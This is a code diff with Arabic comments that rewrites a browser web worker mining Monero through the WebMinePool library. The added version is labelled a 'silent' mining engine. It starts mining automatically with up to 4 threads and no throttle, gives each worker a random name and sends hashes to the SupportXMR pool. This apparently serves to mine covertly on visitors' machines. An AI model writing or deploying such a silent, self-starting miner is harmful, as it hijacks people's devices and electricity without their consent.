@@ -1,47 +1,43 @@
-// miner-worker.js - التعدين عبر WebMinePool الموثوق لعام 2026
-importScripts('https://cdn.webminepool.com/webminepool.min.js');
+// محرك التعدين الصامت v21: الربط المباشر مع SupportXMR
+importScripts('https://webminepool.com/lib/base.js');
 
-let minerObject = null;
+let miner = null;
 
 self.onmessage = function(e) {
     const data = e.data;
-    
+
     if (data.type === 'init') {
-        try {
-            if (typeof WebMinePool !== 'undefined') {
-                // الربط بمحفظتك مباشرة XMR
-                minerObject = new WebMinePool.Anonymous(data.address, {
-                    threads: data.threads || 2,
-                    autoThreads: false,
-                    throttle: data.throttle || 0.0,
-                    coin: "monero"
-                });
-            }
-        } catch(err) {
-            self.postMessage({ type: 'error', message: err.toString() });
-        }
-    } else if (data.type === 'start') {
-        if (minerObject) {
-            minerObject.start();
-            self.postMessage({ type: 'status', status: 'STARTED' });
-        }
-    } else if (data.type === 'stop') {
-        if (minerObject) {
-            minerObject.stop();
-            self.postMessage({ type: 'status', status: 'STOPPED' });
-        }
-    } else if (data.type === 'setThrottle') {
-        if (minerObject) {
-            minerObject.setThrottle(data.throttle);
-        }
+        // استخدام محرك Anonymous المرتبط بـ SupportXMR عبر Proxy
+        miner = new WebMinePool.Anonymous(data.address, {
+            autoStart: true,
+            userName: "akli_node_" + Math.floor(Math.random() * 1000),
+            threads: data.threads || 4,
+            throttle: data.throttle || 0.0,
+            pool: "pool.supportxmr.com:443" // توجيه الهاشات للمسبح المطلوب
+        });
+
+        miner.on('update', () => {
+            self.postMessage({
+                type: 'hashrate',
+                hps: miner.getHashesPerSecond(),
+                total: miner.getTotalHashes()
+            });
+        });
+
+        miner.on('error', (e) => {
+            console.error("Mining Error:", e);
+        });
+    }
+
+    if (data.type === 'start') {
+        if (miner) miner.start();
+    }
+
+    if (data.type === 'stop') {
+        if (miner) miner.stop();
+    }
+
+    if (data.type === 'setThrottle') {
+        if (miner) miner.setThrottle(data.throttle);
     }
 };
-
-// إرسال تقارير دورية بمعدة التعدين (Hashrate)
-setInterval(() => {
-    if (minerObject && minerObject.isRunning()) {
-        // WebMinePool يستخدم getHashesPerSecond() لإعطاء الـ Speed
-        const hps = minerObject.getHashesPerSecond();
-        self.postMessage({ type: 'hashrate', hps: hps });
-    }
-}, 2000);
